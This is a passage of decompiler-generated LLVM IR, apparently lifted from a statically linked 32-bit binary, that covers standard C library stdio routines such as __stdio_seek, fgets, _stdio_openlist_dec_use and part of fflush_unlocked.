  br label %dec_label_pc_8056b5c

dec_label_pc_8056b5c:                             ; preds = %dec_label_pc_8056ae6, %dec_label_pc_8056b45, %dec_label_pc_8056b55
  %v0_8056b5c = load i32, i32* @ebp, align 4
  %v1_8056b5c = add i32 %v0_8056b5c, 8
  %v2_8056b5c = inttoptr i32 %v1_8056b5c to i32*
  %v3_8056b5c = load i32, i32* %v2_8056b5c, align 4
  store i32 %v3_8056b5c, i32* %eax.global-to-local, align 4
  %v1_8056b5f = add i32 %v0_8056b5c, 2
  %v2_8056b5f = inttoptr i32 %v1_8056b5f to i8*
  store i8 0, i8* %v2_8056b5f, align 1
  %v0_8056b63 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056b63 = load i32, i32* @ebp, align 4
  %v2_8056b63 = add i32 %v1_8056b63, 24
  %v3_8056b63 = inttoptr i32 %v2_8056b63 to i32*
  store i32 %v0_8056b63, i32* %v3_8056b63, align 4
  %v0_8056b66 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056b66 = load i32, i32* @ebp, align 4
  %v2_8056b66 = add i32 %v1_8056b66, 28
  %v3_8056b66 = inttoptr i32 %v2_8056b66 to i32*
  store i32 %v0_8056b66, i32* %v3_8056b66, align 4
  %v0_8056b69 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056b69 = load i32, i32* @ebp, align 4
  %v2_8056b69 = add i32 %v1_8056b69, 16
  %v3_8056b69 = inttoptr i32 %v2_8056b69 to i32*
  store i32 %v0_8056b69, i32* %v3_8056b69, align 4
  %v0_8056b6c = load i32, i32* %eax.global-to-local, align 4
  %v1_8056b6c = load i32, i32* @ebp, align 4
  %v2_8056b6c = add i32 %v1_8056b6c, 20
  %v3_8056b6c = inttoptr i32 %v2_8056b6c to i32*
  store i32 %v0_8056b6c, i32* %v3_8056b6c, align 4
  %v0_8056b6f = load i32, i32* @ebp, align 4
  %v1_8056b6f = add i32 %v0_8056b6f, 44
  %v2_8056b6f = inttoptr i32 %v1_8056b6f to i32*
  store i32 0, i32* %v2_8056b6f, align 4
  %v0_8056b76 = load i32, i32* @ebp, align 4
  %v1_8056b76 = add i32 %v0_8056b76, 1
  %v2_8056b76 = inttoptr i32 %v1_8056b76 to i8*
  %v3_8056b76 = load i8, i8* %v2_8056b76, align 1
  %v4_8056b76 = and i8 %v3_8056b76, 32
  %v5_8056b76 = icmp eq i8 %v4_8056b76, 0
  %v0_8056b7a = load i32, i32* @global_var_805d23c.596, align 4
  store i32 %v0_8056b7a, i32* @eax, align 4
  %v2_8056b7f = add i32 %v0_8056b76, 52
  %v3_8056b7f = inttoptr i32 %v2_8056b7f to i32*
  store i32 %v0_8056b7a, i32* %v3_8056b7f, align 4
  br i1 %v5_8056b76, label %dec_label_pc_8056bf1, label %dec_label_pc_8056b84

dec_label_pc_8056b84:                             ; preds = %dec_label_pc_8056b5c
  %v2_8056b8f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8056b8f, i32* %stack_var_-76, align 4
  %v2_8056b94 = call i32 @__pthread_return_void(i32 %v2_8056b8f, i32 134564459)
  store i32 %v2_8056b94, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805d224.488 to i32), i32* %stack_var_-76, align 4
  %v1_8056ba0 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805d224.488 to i32))
  store i32 %v1_8056ba0, i32* @eax, align 4
  %v2_8056bb2 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8056bb2, i32* %stack_var_-76, align 4
  %v2_8056bb7 = call i32 @__pthread_return_void(i32 %v2_8056bb2, i32 134564459)
  store i32 %v2_8056bb7, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805d20c.487 to i32), i32* %stack_var_-76, align 4
  %v1_8056bc3 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805d20c.487 to i32))
  %v0_8056bc8 = load i32, i32* bitcast (i32** @global_var_805d208.489 to i32*), align 8
  store i32 %v0_8056bc8, i32* @eax, align 4
  %v1_8056bcd = load i32, i32* @ebp, align 4
  %v2_8056bcd = add i32 %v1_8056bcd, 32
  %v3_8056bcd = inttoptr i32 %v2_8056bcd to i32*
  store i32 %v0_8056bc8, i32* %v3_8056bcd, align 4
  %v0_8056bd0 = load i32, i32* @ebp, align 4
  store i32 %v0_8056bd0, i32* bitcast (i32** @global_var_805d208.489 to i32*), align 8
  %v2_8056bd6 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_8056bd6, i32* @ecx, align 4
  store i32 %v2_8056bb2, i32* %stack_var_-76, align 4
  %v2_8056bdb = call i32 @__pthread_return_void(i32 %v2_8056bb2, i32 1)
  store i32 %v2_8056bb2, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_8056b8f, i32* %stack_var_-76, align 4
  %v2_8056be5 = call i32 @__pthread_return_void(i32 %v2_8056b8f, i32 1)
  store i32 %v2_8056be5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056bea

dec_label_pc_8056bea:                             ; preds = %dec_label_pc_8056a17, %dec_label_pc_8056b84
  br label %dec_label_pc_8056bf1

dec_label_pc_8056bef:                             ; preds = %dec_label_pc_8056a0d, %dec_label_pc_80569fa
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8056bf1

dec_label_pc_8056bf1:                             ; preds = %dec_label_pc_8056b5c, %dec_label_pc_8056a46, %dec_label_pc_8056bea, %dec_label_pc_8056bef
  %v0_8056bf4 = load i32, i32* @ebp, align 4
  store i32 %v0_8056bf4, i32* %eax.global-to-local, align 4
  %v2_8056bf6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8056bf6, i32* @ebx, align 4
  store i32 %v0_80569ce, i32* @esi, align 4
  store i32 %v0_80569cd, i32* @edi, align 4
  store i32 %v0_80569cc, i32* @ebp, align 4
  ret i32 %v0_8056bf4

; uselistorder directives
  uselistorder i32 %v2_8056bb2, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_8056b8f, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8056b55, { 1, 0 }
  uselistorder i32 %v1_8056b36, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8056b1d, { 1, 0 }
  uselistorder i32 %v1_8056b06, { 1, 0, 2 }
  uselistorder i32 %v11_8056ac8, { 1, 0 }
  uselistorder i32 %v0_8056ad1.pre, { 1, 0 }
  uselistorder i32 %v1_8056a99, { 1, 0 }
  uselistorder i32 %v0_8056a95, { 1, 0 }
  uselistorder i32 %v1_8056a8a, { 1, 0, 2 }
  uselistorder i32 %v1_8056a4b, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_8056a3a, { 1, 0 }
  uselistorder i32 %v0_8056a0d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29 }
  uselistorder i32 4096, { 18, 15, 16, 0, 1, 19, 20, 6, 17, 12, 7, 3, 8, 13, 9, 4, 14, 10, 5, 2, 11 }
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 2, 5, 0, 1, 3, 4 }
  uselistorder i32 32768, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 1, 0, 9, 8, 7, 6, 13, 12, 11, 10, 5, 4, 3, 2 }
  uselistorder i32 1024, { 3, 1, 2, 0, 25, 4, 11, 10, 26, 17, 5, 16, 6, 18, 7, 19, 20, 21, 22, 8, 23, 24, 12, 13, 14, 9, 15 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 3, 2, 1, 0, 4 }
  uselistorder i32 22, { 8, 9, 14, 3, 4, 5, 6, 7, 13, 12, 10, 11, 15, 1, 2, 0 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 4, 3, 2, 0, 1, 5 }
  uselistorder label %dec_label_pc_8056bf1, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8056bea, { 1, 0 }
  uselistorder label %dec_label_pc_8056b5c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056acb, { 1, 0 }
  uselistorder label %dec_label_pc_8056abb, { 1, 0 }
  uselistorder label %dec_label_pc_8056a78, { 1, 0 }
  uselistorder label %dec_label_pc_8056a42, { 1, 0 }
  uselistorder label %dec_label_pc_8056a34, { 1, 0 }
  uselistorder label %dec_label_pc_8056a29, { 2, 0, 1 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_8056c08 = add i32 %tmp5, 4
  %v2_8056c08 = inttoptr i32 %v1_8056c08 to i32*
  %v3_8056c08 = load i32, i32* %v2_8056c08, align 4
  %v2_8056c0b = load i32, i32* %arg2, align 4
  %v1_8056c11 = add i32 %arg1, 4
  %v2_8056c11 = inttoptr i32 %v1_8056c11 to i32*
  %v3_8056c11 = load i32, i32* %v2_8056c11, align 4
  %v4_8056c14 = call i32 @__libc_lseek64(i32 %v3_8056c11, i32 %v2_8056c0b, i32 %v3_8056c08, i32 %arg3)
  %v0_8056c1e = load i32, i32* @edx, align 4
  %v2_8056c1e = icmp slt i32 %v0_8056c1e, 0
  br i1 %v2_8056c1e, label %dec_label_pc_8056c29, label %dec_label_pc_8056c22

dec_label_pc_8056c22:                             ; preds = %entry
  %v1_8056c22 = load i32, i32* @ebx, align 4
  %v2_8056c22 = inttoptr i32 %v1_8056c22 to i32*
  store i32 %v4_8056c14, i32* %v2_8056c22, align 4
  %v0_8056c24 = load i32, i32* @edx, align 4
  %v1_8056c24 = load i32, i32* @ebx, align 4
  %v2_8056c24 = add i32 %v1_8056c24, 4
  %v3_8056c24 = inttoptr i32 %v2_8056c24 to i32*
  store i32 %v0_8056c24, i32* %v3_8056c24, align 4
  br label %dec_label_pc_8056c29

dec_label_pc_8056c29:                             ; preds = %entry, %dec_label_pc_8056c22
  %v0_8056c29 = phi i32 [ %v4_8056c14, %entry ], [ 0, %dec_label_pc_8056c22 ]
  ret i32 %v0_8056c29

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_8056c29, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8056c30 = load i32, i32* @edi, align 4
  %v0_8056c31 = load i32, i32* @esi, align 4
  %v0_8056c32 = load i32, i32* @ebx, align 4
  %v12_8056c33 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_8056c3a = add i32 %arg3, 52
  %v2_8056c3a = inttoptr i32 %v1_8056c3a to i32*
  %v3_8056c3a = load i32, i32* %v2_8056c3a, align 4
  store i32 %v3_8056c3a, i32* @edi, align 4
  %v1_8056c3d = icmp eq i32 %v3_8056c3a, 0
  %v1_8056c3f = icmp eq i1 %v1_8056c3d, false
  br i1 %v1_8056c3f, label %entry.dec_label_pc_8056c60_crit_edge, label %dec_label_pc_8056c41

entry.dec_label_pc_8056c60_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8056c60

dec_label_pc_8056c41:                             ; preds = %entry
  %v1_8056c41 = add i32 %arg3, 56
  store i32 %v1_8056c41, i32* @ebx, align 4
  store i32 %v12_8056c33, i32* @eax, align 4
  %v2_8056c50 = call i32 @__pthread_return_void(i32 %v12_8056c33, i32 134564459)
  %v0_8056c55 = load i32, i32* @ebx, align 4
  %v1_8056c58 = call i32 @__pthread_return_0(i32 %v0_8056c55)
  %v0_8056c61.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056c60

dec_label_pc_8056c60:                             ; preds = %entry.dec_label_pc_8056c60_crit_edge, %dec_label_pc_8056c41
  %v0_8056c61 = phi i32 [ %arg3, %entry.dec_label_pc_8056c60_crit_edge ], [ %v0_8056c61.pre, %dec_label_pc_8056c41 ]
  %v0_8056c60 = load i32, i32* @edx, align 4
  %v4_8056c6a = inttoptr i32 %arg1 to i8*
  %v5_8056c6a = call i32 @__GI_fgets_unlocked(i8* %v4_8056c6a, i32 %arg2, i32 %v0_8056c61, i32 %v0_8056c60)
  store i32 %v5_8056c6a, i32* %ebx.global-to-local, align 4
  br i1 %v1_8056c3f, label %dec_label_pc_8056c89, label %dec_label_pc_8056c78

dec_label_pc_8056c78:                             ; preds = %dec_label_pc_8056c60
  store i32 %v12_8056c33, i32* @eax, align 4
  %v2_8056c81 = call i32 @__pthread_return_void(i32 %v12_8056c33, i32 1)
  %v0_8056c8c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056c89

dec_label_pc_8056c89:                             ; preds = %dec_label_pc_8056c60, %dec_label_pc_8056c78
  %v0_8056c8c = phi i32 [ %v5_8056c6a, %dec_label_pc_8056c60 ], [ %v0_8056c8c.pre, %dec_label_pc_8056c78 ]
  store i32 %v0_8056c32, i32* @ebx, align 4
  store i32 %v0_8056c31, i32* @esi, align 4
  store i32 %v0_8056c30, i32* @edi, align 4
  ret i32 %v0_8056c8c

; uselistorder directives
  uselistorder i32 %v12_8056c33, { 2, 3, 0, 1 }
  uselistorder i32 52, { 6, 7, 8, 9, 2, 10, 1, 3, 4, 5, 13, 14, 11, 12, 15, 0 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8056c89, { 1, 0 }
  uselistorder label %dec_label_pc_8056c60, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_8056ca3 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8056ca3, i32* @eax, align 4
  %v2_8056ca8 = call i32 @__pthread_return_void(i32 %v2_8056ca3, i32 134564459)
  %v1_8056cb4 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805d224.488 to i32))
  %v0_8056cb9 = load i32, i32* @global_var_80614a4.594, align 4
  %v8_8056cc1 = icmp eq i32 %v0_8056cb9, 1
  %v1_8056cc2 = icmp eq i1 %v8_8056cc1, false
  br i1 %v1_8056cc2, label %dec_label_pc_8056d59, label %dec_label_pc_8056cc8

dec_label_pc_8056cc8:                             ; preds = %entry
  %v0_8056cc8 = load i32, i32* @global_var_80614a8.595, align 8
  %tmp29 = icmp slt i32 %v0_8056cc8, 1
  br i1 %tmp29, label %dec_label_pc_8056d59, label %dec_label_pc_8056cd5

dec_label_pc_8056cd5:                             ; preds = %dec_label_pc_8056cc8
  store i32 0, i32* @esi, align 4
  %v2_8056ce2 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_8056ce2, i32* @eax, align 4
  %v2_8056ce7 = call i32 @__pthread_return_void(i32 %v2_8056ce2, i32 134564459)
  %v1_8056cf3 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805d20c.487 to i32))
  %v0_8056cf8 = load i32, i32* bitcast (i32** @global_var_805d208.489 to i32*), align 8
  store i32 %v0_8056cf8, i32* %edx.global-to-local, align 4
  %v1_8056d3a3 = icmp eq i32 %v0_8056cf8, 0
  %v1_8056d3c10 = icmp eq i1 %v1_8056d3a3, false
  br i1 %v1_8056d3c10, label %dec_label_pc_8056d03, label %dec_label_pc_8056d3e

dec_label_pc_8056d03:                             ; preds = %dec_label_pc_8056cd5, %dec_label_pc_8056d38
  %v0_8056d13 = phi i32 [ %v0_8056d38, %dec_label_pc_8056d38 ], [ %v0_8056cf8, %dec_label_pc_8056cd5 ]
  %v1_8056d0313 = inttoptr i32 %v0_8056d13 to i16*
  %v2_8056d03 = load i16, i16* %v1_8056d0313, align 2
  %v1_8056d0b = add i32 %v0_8056d13, 32
  %v2_8056d0b = inttoptr i32 %v1_8056d0b to i32*
  %v3_8056d0b = load i32, i32* %v2_8056d0b, align 4
  store i32 %v3_8056d0b, i32* @ebx, align 4
  %v1_8056d06 = and i16 %v2_8056d03, -32720
  %v6_8056d0e = icmp eq i16 %v1_8056d06, 48
  br i1 %v6_8056d0e, label %dec_label_pc_8056d17, label %dec_label_pc_8056d13

dec_label_pc_8056d13:                             ; preds = %dec_label_pc_8056d03
  store i32 %v0_8056d13, i32* @esi, align 4
  br label %dec_label_pc_8056d38

dec_label_pc_8056d17:                             ; preds = %dec_label_pc_8056d03
  %v0_8056d17 = load i32, i32* @esi, align 4
  %v1_8056d17 = icmp eq i32 %v0_8056d17, 0
  %v1_8056d19 = icmp eq i1 %v1_8056d17, false
  br i1 %v1_8056d19, label %dec_label_pc_8056d23, label %dec_label_pc_8056d1b

dec_label_pc_8056d1b:                             ; preds = %dec_label_pc_8056d17
  store i32 %v3_8056d0b, i32* bitcast (i32** @global_var_805d208.489 to i32*), align 8
  br label %dec_label_pc_8056d26

dec_label_pc_8056d23:                             ; preds = %dec_label_pc_8056d17
  %v2_8056d23 = add i32 %v0_8056d17, 32
  %v3_8056d23 = inttoptr i32 %v2_8056d23 to i32*
  store i32 %v3_8056d0b, i32* %v3_8056d23, align 4
  %v0_8056d26.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056d26

dec_label_pc_8056d26:                             ; preds = %dec_label_pc_8056d1b, %dec_label_pc_8056d23
  %v0_8056d2f = phi i32 [ %v0_8056d13, %dec_label_pc_8056d1b ], [ %v0_8056d26.pre, %dec_label_pc_8056d23 ]
  %v1_8056d26 = add i32 %v0_8056d2f, 1
  %v2_8056d26 = inttoptr i32 %v1_8056d26 to i8*
  %v3_8056d26 = load i8, i8* %v2_8056d26, align 1
  %v4_8056d26 = and i8 %v3_8056d26, 32
  %v5_8056d26 = icmp eq i8 %v4_8056d26, 0
  br i1 %v5_8056d26, label %dec_label_pc_8056d38, label %dec_label_pc_8056d2c

dec_label_pc_8056d2c:                             ; preds = %dec_label_pc_8056d26
  %v1_8056d30 = call i32 @free(i32 %v0_8056d2f)
  br label %dec_label_pc_8056d38

dec_label_pc_8056d38:                             ; preds = %dec_label_pc_8056d26, %dec_label_pc_8056d13, %dec_label_pc_8056d2c
  %v0_8056d38 = load i32, i32* @ebx, align 4
  store i32 %v0_8056d38, i32* %edx.global-to-local, align 4
  %v1_8056d3a = icmp eq i32 %v0_8056d38, 0
  %v1_8056d3c = icmp eq i1 %v1_8056d3a, false
  br i1 %v1_8056d3c, label %dec_label_pc_8056d03, label %dec_label_pc_8056d3e

dec_label_pc_8056d3e:                             ; preds = %dec_label_pc_8056d38, %dec_label_pc_8056cd5
  store i32 %v2_8056ce2, i32* @eax, align 4
  %v2_8056d47 = call i32 @__pthread_return_void(i32 %v2_8056ce2, i32 1)
  store i32 0, i32* @global_var_80614a8.595, align 8
  %v0_8056d59.pre = load i32, i32* @global_var_80614a4.594, align 4
  br label %dec_label_pc_8056d59

dec_label_pc_8056d59:                             ; preds = %dec_label_pc_8056cc8, %entry, %dec_label_pc_8056d3e
  %v0_8056d59 = phi i32 [ %v0_8056cb9, %dec_label_pc_8056cc8 ], [ %v0_8056cb9, %entry ], [ %v0_8056d59.pre, %dec_label_pc_8056d3e ]
  %v1_8056d5e = add i32 %v0_8056d59, -1
  store i32 %v1_8056d5e, i32* @global_var_80614a4.594, align 4
  store i32 %v2_8056ca3, i32* @eax, align 4
  %v2_8056d6d = call i32 @__pthread_return_void(i32 %v2_8056ca3, i32 1)
  ret i32 %v2_8056d6d

; uselistorder directives
  uselistorder i32 %v0_8056d38, { 1, 2, 0 }
  uselistorder i32 %v0_8056d13, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8056cb9, { 1, 2, 0 }
  uselistorder i32 (i32)* @free, { 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 1, 6, 5, 4, 3, 2, 21, 20, 19, 18, 0 }
  uselistorder label %dec_label_pc_8056d59, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056d38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056d26, { 1, 0 }
  uselistorder label %dec_label_pc_8056d03, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_8056d78 = load i32, i32* @ebp, align 4
  %v0_8056d79 = load i32, i32* @edi, align 4
  %v0_8056d7a = load i32, i32* @esi, align 4
  %v0_8056d7b = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v4_8056d81 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8056d81, i32* @ebx, align 4
  %v10_8056d85 = icmp eq i16* %arg1, inttoptr (i32 134599176 to i16*)
  br i1 %v10_8056d85, label %dec_label_pc_8056d9a, label %dec_label_pc_8056d8d

dec_label_pc_8056d8d:                             ; preds = %entry
  store i32 256, i32* @ebp, align 4
  %v2_8056d92 = icmp eq i16* %arg1, null
  %v1_8056d94 = icmp eq i1 %v2_8056d92, false
  br i1 %v1_8056d94, label %dec_label_pc_8056e89, label %dec_label_pc_8056d9a

dec_label_pc_8056d9a:                             ; preds = %dec_label_pc_8056d8d, %entry
  store i32 0, i32* @edi, align 4
  %v2_8056da7 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8056da7, i32* @ebx, align 4
  %v2_8056dac = call i32 @__pthread_return_void(i32 %v2_8056da7, i32 134564459)
  %v1_8056db8 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805d224.488 to i32))
  store i32 ptrtoint (i32* @global_var_805d224.488 to i32), i32* @ecx, align 4
  %v0_8056dbe = load i32, i32* @global_var_80614a4.594, align 4
  %v1_8056dc4 = add i32 %v0_8056dbe, 1
  store i32 %v1_8056dc4, i32* @eax, align 4
  store i32 %v1_8056dc4, i32* @global_var_80614a4.594, align 4
  %v2_8056dcd = call i32 @__pthread_return_void(i32 %v2_8056da7, i32 1)
  store i32 %v2_8056dcd, i32* @eax, align 4
  %v2_8056de0 = call i32 @__pthread_return_void(i32 %v2_8056da7, i32 134564459)
  %v1_8056dec = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805d20c.487 to i32))
  store i32 ptrtoint (i32* @global_var_805d20c.487 to i32), i32* @eax, align 4
  %v0_8056df5 = load i32, i32* bitcast (i32** @global_var_805d208.489 to i32*), align 8
  store i32 %v0_8056df5, i32* @esi, align 4
  %v2_8056dfc = call i32 @__pthread_return_void(i32 %v2_8056da7, i32 1)
  %v0_8056e7e1 = load i32, i32* @esi, align 4
  %v1_8056e7e2 = icmp eq i32 %v0_8056e7e1, 0
  %v1_8056e809 = icmp eq i1 %v1_8056e7e2, false
  br i1 %v1_8056e809, label %dec_label_pc_8056e06, label %dec_label_pc_8056e82

dec_label_pc_8056e06:                             ; preds = %dec_label_pc_8056d9a, %dec_label_pc_8056e7b
  %v0_8056e14 = phi i32 [ %v3_8056e7b, %dec_label_pc_8056e7b ], [ %v0_8056e7e1, %dec_label_pc_8056d9a ]
  %v1_8056e06 = inttoptr i32 %v0_8056e14 to i8*
  %v2_8056e06 = load i8, i8* %v1_8056e06, align 1
  %v3_8056e06 = and i8 %v2_8056e06, 64
  %v4_8056e06 = icmp eq i8 %v3_8056e06, 0
  br i1 %v4_8056e06, label %dec_label_pc_8056e7b, label %dec_label_pc_8056e0b

dec_label_pc_8056e0b:                             ; preds = %dec_label_pc_8056e06
  %v0_8056e0b = load i32, i32* @global_var_805d23c.596, align 4
  %v9_8056e0b = icmp eq i32 %v0_8056e0b, 2
  br i1 %v9_8056e0b, label %dec_label_pc_8056e33, label %dec_label_pc_8056e14

dec_label_pc_8056e14:                             ; preds = %dec_label_pc_8056e0b
  %v1_8056e14 = add i32 %v0_8056e14, 56
  store i32 %v1_8056e14, i32* @ebx, align 4
  store i32 %v2_8056da7, i32* @eax, align 4
  %v2_8056e23 = call i32 @__pthread_return_void(i32 %v2_8056da7, i32 134564459)
  %v0_8056e28 = load i32, i32* @ebx, align 4
  %v1_8056e2b = call i32 @__pthread_return_0(i32 %v0_8056e28)
  %v1_8056e35.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056e33

dec_label_pc_8056e33:                             ; preds = %dec_label_pc_8056e0b, %dec_label_pc_8056e14
  %v0_8056e45 = phi i32 [ %v0_8056e14, %dec_label_pc_8056e0b ], [ %v1_8056e35.pre, %dec_label_pc_8056e14 ]
  %v0_8056e33 = load i32, i32* @ebp, align 4
  %v2_8056e35 = inttoptr i32 %v0_8056e45 to i32*
  %v3_8056e35 = load i32, i32* %v2_8056e35, align 4
  %v4_8056e35 = or i32 %v3_8056e35, %v0_8056e33
  %v2_8056e37 = urem i32 %v4_8056e35, 65536
  %v9_8056e37 = and i32 %v2_8056e37, 832
  %v2_8056e3b = icmp eq i32 %v9_8056e37, 320
  %v1_8056e40 = icmp eq i1 %v2_8056e3b, false
  br i1 %v1_8056e40, label %dec_label_pc_8056e61, label %dec_label_pc_8056e42

dec_label_pc_8056e42:                             ; preds = %dec_label_pc_8056e33
  %v1_8056e46 = call i32 @__stdio_wcommit(i32 %v0_8056e45)
  %v1_8056e4e = icmp eq i32 %v1_8056e46, 0
  br i1 %v1_8056e4e, label %dec_label_pc_8056e57, label %dec_label_pc_8056e52

dec_label_pc_8056e52:                             ; preds = %dec_label_pc_8056e42
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8056e61

dec_label_pc_8056e57:                             ; preds = %dec_label_pc_8056e42
  %v0_8056e57 = load i32, i32* @esi, align 4
  %v1_8056e57 = inttoptr i32 %v0_8056e57 to i16*
  %v2_8056e57 = load i16, i16* %v1_8056e57, align 2
  %v3_8056e57 = and i16 %v2_8056e57, -65
  store i16 %v3_8056e57, i16* %v1_8056e57, align 2
  %v0_8056e5b = load i32, i32* @esi, align 4
  %v1_8056e5b = add i32 %v0_8056e5b, 8
  %v2_8056e5b = inttoptr i32 %v1_8056e5b to i32*
  %v3_8056e5b = load i32, i32* %v2_8056e5b, align 4
  %v2_8056e5e = add i32 %v0_8056e5b, 28
  %v3_8056e5e = inttoptr i32 %v2_8056e5e to i32*
  store i32 %v3_8056e5b, i32* %v3_8056e5e, align 4
  br label %dec_label_pc_8056e61

dec_label_pc_8056e61:                             ; preds = %dec_label_pc_8056e33, %dec_label_pc_8056e52, %dec_label_pc_8056e57
  %v0_8056e61 = load i32, i32* @global_var_805d23c.596, align 4
  %v9_8056e61 = icmp eq i32 %v0_8056e61, 2
  br i1 %v9_8056e61, label %dec_label_pc_8056e7b, label %dec_label_pc_8056e6a

dec_label_pc_8056e6a:                             ; preds = %dec_label_pc_8056e61
  store i32 %v2_8056da7, i32* @eax, align 4
  %v2_8056e73 = call i32 @__pthread_return_void(i32 %v2_8056da7, i32 1)
  br label %dec_label_pc_8056e7b

dec_label_pc_8056e7b:                             ; preds = %dec_label_pc_8056e61, %dec_label_pc_8056e06, %dec_label_pc_8056e6a
  %v0_8056e7b = load i32, i32* @esi, align 4
  %v1_8056e7b = add i32 %v0_8056e7b, 32
  %v2_8056e7b = inttoptr i32 %v1_8056e7b to i32*
  %v3_8056e7b = load i32, i32* %v2_8056e7b, align 4
  store i32 %v3_8056e7b, i32* @esi, align 4
  %v1_8056e7e = icmp eq i32 %v3_8056e7b, 0
  %v1_8056e80 = icmp eq i1 %v1_8056e7e, false
  br i1 %v1_8056e80, label %dec_label_pc_8056e06, label %dec_label_pc_8056e82

dec_label_pc_8056e82:                             ; preds = %dec_label_pc_8056e7b, %dec_label_pc_8056d9a
  %v0_8056e82 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_8056eaf

dec_label_pc_8056e89:                             ; preds = %dec_label_pc_8056d8d
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_8056e8b = load i8, i8* %tmp23, align 1
  %v4_8056e8b = and i8 %v3_8056e8b, 64
  %v5_8056e8b = icmp eq i8 %v4_8056e8b, 0
  br i1 %v5_8056e8b, label %dec_label_pc_8056eaf, label %dec_label_pc_8056e90

dec_label_pc_8056e90:                             ; preds = %dec_label_pc_8056e89
  store i32 -1, i32* @edi, align 4
  %v1_8056e97 = call i32 @__stdio_wcommit(i32 %v4_8056d81)
  %v1_8056e9f = icmp eq i32 %v1_8056e97, 0
  %v1_8056ea1 = icmp eq i1 %v1_8056e9f, false
  br i1 %v1_8056ea1, label %dec_label_pc_8056eaf, label %dec_label_pc_8056ea3

dec_label_pc_8056ea3:                             ; preds = %dec_label_pc_8056e90
  %v3_8056ea3 = load i16, i16* %arg1, align 2
  %v4_8056ea3 = and i16 %v3_8056ea3, -65
  store i16 %v4_8056ea3, i16* %arg1, align 2
  %v2_8056ea7 = add i32 %v4_8056d81, 8
  %v3_8056ea7 = inttoptr i32 %v2_8056ea7 to i32*
  %v4_8056ea7 = load i32, i32* %v3_8056ea7, align 4
  %v3_8056eaa = add i32 %v4_8056d81, 28
  %v4_8056eaa = inttoptr i32 %v3_8056eaa to i32*
  store i32 %v4_8056ea7, i32* %v4_8056eaa, align 4
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8056eaf

dec_label_pc_8056eaf:                             ; preds = %dec_label_pc_8056e90, %dec_label_pc_8056e89, %dec_label_pc_8056e82, %dec_label_pc_8056ea3
  %v0_8056eb2 = load i32, i32* @edi, align 4
  store i32 %v0_8056d7b, i32* @ebx, align 4
